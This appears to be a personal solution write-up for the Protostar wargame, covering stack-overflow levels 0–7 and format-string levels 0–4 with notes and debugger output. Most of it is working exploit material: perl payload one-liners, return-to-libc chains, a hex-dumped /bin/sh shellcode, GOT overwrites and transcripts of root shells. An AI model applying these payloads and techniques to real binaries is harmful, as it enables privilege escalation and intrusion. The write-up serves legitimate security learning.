--------------------------------------------------------SMASHING THE STACK-------------------------------------------------------------------------

Stack 0:
	-  Have to change the value of a variable
	-  Get the address of the variable while debugging the program (say A)
	-  Get the start address of your input by setting a breakpoint on the function call and looking at the stack arguments (say B)
	-  gets() is bad and allows unbounded input
	-  Calculate the difference between A and B. A > B as the stack moves towards 0. The difference is the number of bytes you need in B to reach A
	-	The difference + 1 is what you need to overwrite a single byte of data
	-	Here you need to pass 65 bytes to overwrite A. A single byte is enough, as all it is checking is if the byte is a zero (TEST assembly inst)
	-	If it is non-zero, you have solved the challenge as you get a message saying you have overwritten the modified variable
	-	Note that overwriting it with the character '0' will fail as the character '0' is 0x30, which is what is checked
	-	The only character that will continue to pass the test is \x0 (The Null character)
	
	Pass: perl -e 'print   "0"x65'  |./stack0
	Fail:	perl -e 'print "\x0"x65'|./stack0
	
Stack 1:
	-	Same as before. Have to change a variable's value
	-	Same procedure as before, get the address of the variable you want to change, then the address of your input and the difference
	-	The difference is the number of bytes you need to write to reach
	-	strcpy() is bad and allows unbounded input
	-	Then you start the overwrite - in this case the value of the memory location needs to be abcd
	-	64 bytes reaches the location
	-	4 bytes in reverse order (as its little endian) dcba
	
	Pass: ./stack1 `perl -e 'print "a"x64;print "d";print "c";print "b";print "a"'`

Stack 2:
	-	Same logic as before. In this case it is an environment variable that contains the input though
	-	The difference between the input and the variable to be overwritten is again 64 bytes
	-	strcpy() used again
	-	The GREENIE environment variable must contain the payload
		
		Pass: export GREENIE=`perl -e 'print "a"x64;print "\x0a\x0d\x0a\x0d"'`
				./stack2

Stack 3:
	-	Same logic. Last time I'm repeating this :). Unless otherwise mentioned the logic will always be the same.
	-	The difference between the input and the variable to be overwritten is again 64 bytes
	-	gets()
	-	We need to now jump to a different function in the same program
	-	Get the address of that function which turns out to be 0x08048424
	-	Write 64 bytes of junk and then the function address in little endian, which basically means - reverse the order of every byte
	-	The function addres above is hence written as 24840408
	
		Pass:	 perl -e 'print "a" x 64;print "\x24\x84\x04\x08"'|./stack3

Stack 4:
	-	gets()
	-	We need to now jump to a different function in the same program, we get the address like last time and form the shell code
	-	We need to overwrite the return address of main() here, because that's what has the bad gets() call
	-	This is done and the win() function runs
	-	Then however win() returns to an address on the stack where there is junk and thus crashes
	-	If you do not want it to crash you will have to write shell code to make it exit cleanly
	
		Pass:	perl -e 'print "a"x76;print "\xf4\x83\x04\x08"' > ~/s4_payload
				./stack4 < ~/s4_payload

Stack 5:
	-  gets()
	-  Need to write shell code
	-  76 bytes to ret
	-  4 bytes for the address
	-  44 nops, 32 byte shell code, 4 byte address that jumps into the nopsled
	-  Allow users to dump core files: echo 1 > /proc/sys/fs/suid_dumpable
	-  root still has to give permissions though to the core file for the user to be able to load it into gdb
	-  Use gdb -q -c <core file> while analyzing the dump
	-  Use x/40xw $esp-100 to get the starting address of the input. For some reason this was super super tricky and I needed a spoiler to
		understand what I was doing wrong and I still don't get it :(. Maybe it was because I was trying to debug as root, but run as user. Oh well.

	Here's the final payload:
	
	user@protostar:~$ xxd -g1 payload 
	0000000: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
	0000010: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
	0000020: 90 90 90 90 90 90 90 90 90 90 90 90 31 c0 31 db  ............1.1.
	0000030: 31 c9 31 d2 b0 0b eb 06 5b 88 4b 07 cd 80 e8 f5  1.1.....[.K.....
	0000040: ff ff ff 2f 62 69 6e 2f 73 68 4e 90 ac f7 ff bf  .../bin/shN.....
	
	-	And here's how to keep the shell open. I'm not clear why it is done this way though.
	perl -e 'print "a" x 80;print "\xb0\xff\xec\xb7";print "\xc0\x60\xec\xb7";print "\xe3\xf9\xff\xbf"' > payload
	user@protostar:~$ (cat payload; cat) | /opt/protostar/bin/stack5

	whoami
	root
	
	-	Using relative and absolute paths for the payload or the binary do not seem to matter
	-	Running the exact same commands as root though seems to fail, it doesn't crash but the commands do not execute either

Stack 6:
	-	gets(). 80 bytes to ret of getpath(). 4 bytes for address. Same 80 bytes in total again.
	-	Can't put address on stack though as getpath() checks it and prohibits it.
	-	So the shellcode has to be somewhere else.
	-	80 bytes. Address of system(). Address of exit() so it doesn't crash on returning. Address of env variable which has "/bin/sh".
	-	Exploit works but it drops privileges at runtime if I use system(), so the shell never launches.
	
	-	If I put in "/bin/id" though, that seems to work but with lower privileges. Here is the exact payload:
		perl -e 'print "a" x 80;print "\xb0\xff\xec\xb7";print "\xc0\x60\xec\xb7";print "\xe3\xf9\xff\xbf"' > payload1
	
	-	Lets now try the setuid(0) before we call system() and see if that works. That fails as I can't call setuid(0) as a normal user. Plus it
		also crashes, as the system() function returns to the 00000000 instead
		perl -e 'print "a" x 80;print "\x80\xec\xf2\xb7";print "\xb0\xff\xec\xb7";print "\x00\x00\x00\x00";print "\xe3\xf9\xff\xbf"' > payload2
		
	-	Lets try the execl("/bin/sh","/bin/sh",0) call now. Nothing after the execl will run but it'll run 1 command for sure. This works too
		but again, it's a shell with low privileges
		perl -e 'print "a" x 80;print "\x60\xe4\xf2\xb7";print "\xef\xbe\xad\xde";print "\xe3\xf9\xff\xbf";print "\xe3\xf9\xff\xbf";print "\x00\x00\x00\x00"' > payload4

	-	execl call with the right arguments and an exit()
		perl -e 'print "a" x 80;print "\x60\xe4\xf2\xb7";print "\xc0\x60\xec\xb7";print "\xe3\xf9\xff\xbf";print "\xe3\xf9\xff\xbf";print "\x00\x00\x00\x00"' > payload5
	
	-	Adding null bytes or a newline stops the segfault but ends the shell code and hence doesn't smash the stack. So that's a fail again.
	
	-	Try adding comments now AND smash the stack. This works in a normal system() poc.
		perl -e 'print "/bin/sh";print ";\#";print "\x90" x 71;print "\xb0\xff\xec\xb7";print "\xc0\x60\xec\xb7";print "\x7c\xf7\xff\xbf"' > payload6

		user@protostar:~/stack6$ ./s1 `cat payload6`
		$ 

	-	Now try with the actual binary and it fails #-o

	-	Anyway in the end, writing a python wrapper (s6.py )for the whole code worked. Thanks Matthew for the idea :)
	
	-	But running it using the cat trick is a fail even though the payload is exactly the same. Use the script g1.sh to generate this failed
		payload.
		
		user@protostar:~$ python s6.py 
		Offset: 0x9c
		0000000: 2f 75 73 72 2f 62 69 6e 2f 69 64 3b 23 90 90 90  /usr/bin/id;#...
		0000010: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
		0000020: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
		0000030: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
		0000040: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
		0000050: b0 ff ec b7 c0 60 ec b7 9c f7 ff bf              .....`......
		input path please: uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
		
Stack 7:
	-	gets(). 80 chars. Same.
	-	Address check preventing stuff on stack
	-	strdup() there though. returns a pointer into eax for your payload
	-	Coz ret to point into payload and you're good. Same logic as stack, just a different address
	-	Payload construction was a bit tricky here. nop+shellcode+address failed as the code kept overwriting my shellcode and making it crash
	-	So moved the shellcode over to a different place in the payload and pointed ret there instead
	-	Here's the exact steps though:
	
		user@protostar:~/stack7$ perl -e 'print "\x90" x 16' > nop1
		user@protostar:~/stack7$ perl -e 'print "\x90" x 32' > nop2
		user@protostar:~/stack7$ cp nop1 payload 
		user@protostar:~/stack7$ cat sc >> payload 
		user@protostar:~/stack7$ cat nop2 >> payload 

		user@protostar:~/stack7$ wc -c payload 
		80 payload
	
		user@protostar:~/stack7$ cat addr >> payload 
		user@protostar:~/stack7$ wc -c payload 
		84 payload

		user@protostar:~/stack7$ (cat payload;cat)|/opt/protostar/bin/stack7
		input path please: 
		got path ����������������1�1�1�1Ұ
				                           �[�K̀�����/bin/shN�����������������������������
		id
		uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
		
		
----------------------------------------------------------------FORMAT STRINGS---------------------------------------------------------------------
http://inst.eecs.berkeley.edu/~cs161/sp08/Notes/formatstring-1.2.pdf
http://garage4hackers.com/archive/index.php/t-1414.html

NOTE: If it runs inside gdb I'm gonna consider it solved and not waste time searching for addresses outside..with core dumps etc. I'll do that
		some other time.
		
Format 0:

	LSB:	 	$(perl -e 'print "\x6c\xf7\xff\xbf"."JUNK"')%210x%x%x%x%x%n
	LSB+1:	$(perl -e 'print "\x6c\xf7\xff\xbf"."JUNK"."\x6d\xf7\xff\xbf"')%202x%x%x%x%x%n%207x%n

	Trying the same technique for the next byte though, fails badly and I seem to be able to add only 209. Also, on a side note, since I'm 
	restarting the program in gdb every time, suddenly the addresses randomly change. I'm not clear why just now.
		
	So I had to use the direct parameter access technique instead which worked for the next 2 bytes :)
	
	LSB+2:	$(perl -e 'print "\x5c\xf7\xff\xbf"."\x5d\xf7\xff\xbf"."\x5e\xf7\xff\xbf"')%227x%6\$n%207x%7\$n%239x%8\$n
	LSB+3:	$(perl -e 'print "\x4c\xf7\xff\xbf"."\x4d\xf7\xff\xbf"."\x4e\xf7\xff\xbf"."\x4f\xf7\xff\xbf"')%223x%6\$n%207x%7\$n%239x%8\$n%49x%9\$n
	
	That worked and I got the "hit the target" message, but the program then segfaulted and died. Not sure why. Probably coz when vuln returned
	it tried to jump to some random address on the stack. Need to explore that more some time.
	
	0x08048330 in puts@plt ()
	(gdb) fin
	Run till exit from #0  0x08048330 in puts@plt ()
	you have hit the target correctly :)
	vuln (string=0x20202020 <Address 0x20202020 out of bounds>) at format0/format0.c:18
	18	in format0/format0.c
	(gdb) c

Format 1:

	objdump -t gives the address for the global variable target (0x08049638)
	User input is at 0xbffff770
	Need to find out how far up the stack it is now and overwrite it. Fuzzed the program with large numbers of "%x." and maxed out at 130.
	%130x up we find out input and we need to now control it
	
	This atleast aligns properly. Now lets try and write to it. The write though, using the previous technique is failing and it segfaults.
	./format1 $(perl -e 'print "XX";print "ABCD"; print "%08x." x 130')
	
	Anyway, while I'm not totally clear about how "exactly" things work, this worked inside gdb. It was address + 9 padding characters + 135%x + %n
	
	Looking at the exact instruction on which vfprintf kept segfaulting was helpful to start with.

	(gdb) set args $(perl -e 'print "\x38\x96\x04\x08\x42\x42\x42\x42\x42\x42\x42\x42\x42"')%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n
	(gdb) 
	(gdb) r
	Starting program: /opt/protostar/bin/format1 $(perl -e 'print "\x38\x96\x04\x08\x42\x42\x42\x42\x42\x42\x42\x42\x42"')%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n
	8�BBBBBBBBB804960cbffff6988048469b7fd8304b7fd7ff4bffff6988048435bffff880b7ff1040804845bb7fd7ff480484500bffff718b7eadc762bffff744bffff750b7fe1848bffff700ffffffffb7ffeff4804824d1bffff700b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff71815efe66d3fbad07d000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff74480484508048440b7ff1040bffff73cb7fff8f82bffff865bffff8800bffff99ebffff9a8bffff9c5bffff9d9bffff9e1bffff9f3bffffa03bffffa16bffffa23bffffa32bffffa3ebffffa49bffffa87bffffa98bfffff88bfffff96bfffffadbfffffd8020b7fe241421b7fe20001078bfbff61000116438048034420577b7fe30008098048340b3e9c3e9d3e9e3e917119bffff84b1fbfffffe1fbffff85b000001100000053ac68087c897501fa986a5a691fb5e53638360706f2f0072702f74736f746f2f7261742f6e69626d726f66317461
	
	you have modified the target :)

	Program exited with code 040.
	(gdb)

Using direct parameter access AND inside gdb also works, but weirdly the number of %x goes up by 3 for some reason:
	set args $(perl -e 'print "\x38\x96\x04\x08\x42\x42\x42\x42\x42\x42\x42\x42\x42"')%x%138\$n

Starting program: /opt/protostar/bin/format1 $(perl -e 'print "\x38\x96\x04\x08\x42\x42\x42\x42\x42\x42\x42\x42\x42"')%x%138\$n
8�BBBBBBBBB804960cyou have modified the target :)

Program exited with code 040.

user@protostar:/opt/protostar/bin$ ./format1 $(perl -e 'print "\x42\x42\x42\x42\x42\x42\x42\x38\x96\x04\x08\x42\x42"')%x%130\$n
BBBBBBB8�BB804960cyou have modified the target :)

And some more experimenting eventually gives this, which now makes much more sense. I shouldn't need 9 bytes padding or wtvr, its a wrap around
and makes no sense.

./format1 $(perl -e 'print "\x38\x96\x04\x08"; print "\x42"x2')%x%130\$n
8�BB804960cyou have modified the target :)

Format 2:
	-	Use objdump trick to get the address of "target". Same as before. The address is 080496e4.

	-	User input is the 4th parameter, found this by fuzzing as usual
		perl -e 'print "aaaa_";print "%08x." x 4' | ./format2

	-	Create the payload as usual
		perl -e 'print "\xe4\x96\x04\x08"' > /home/user/payload
		perl -e 'print "%60x%4\$n"' >> /home/user/payload
		
	user@protostar:/opt/protostar/bin$ ./format2 < ~/payload 
��                                                         200you have modified the target :)

Format 3:
	-	objdump again. target at 080496f4
	-	User input is the 12th parameter - perl -e 'print "aaaa_";print "%08x." x 12' | ./format3
aaaa_00000000.bffff5e0.b7fd7ff4.00000000.00000000.bffff7e8.0804849d.bffff5e0.00000200.b7fd8420.bffff624.61616161.
	-	Create payload
		perl -e 'print "\xf4\x96\x04\x08"."\xf5\x96\x04\x08"."\xf6\x96\x04\x08"' > /home/user/payload
		perl -e 'print "%56x%12\$n%17x%13\$n%173x%14\$n"' >> /home/user/payload

Format 4:
	-	objdump -t to find hello's address:	080484b4
	-	objdump -TR to find exit() address:	08049724 (GOT)
	-	If I can overwrite exit() address with that of hello() I should be good. Exit call goes to the PLT, then to the GOT..should get hello's
		address and jump there instead of the actual exit
	-	User input is the 4th parameter	-	perl -e 'print "aaaa_";print "%08x." x 4' | ./format4
aaaa_00000200.b7fd8420.bffff624.61616161.
	-	Create payload
		perl -e 'print "\x24\x97\x04\x08"."\x25\x97\x04\x08"."\x26\x97\x04\x08"."\x27\x97\x04\x08"' > /home/user/payload
		perl -e 'print "%164x%4\$n%208x%5\$n%128x%6\$n%4c%7\$n"' >> /home/user/payload
		
		user@protostar:/opt/protostar/bin$ ./format4 < ~/payload 
$�%�&�'�                                                                                                                                                                 200                                                                                                                                                                                                        b7fd8420                                                                                                                        bffff624   $

		code execution redirected! you win
		
----------------------------------------------------------------HEAP---------------------------------------------------------------------


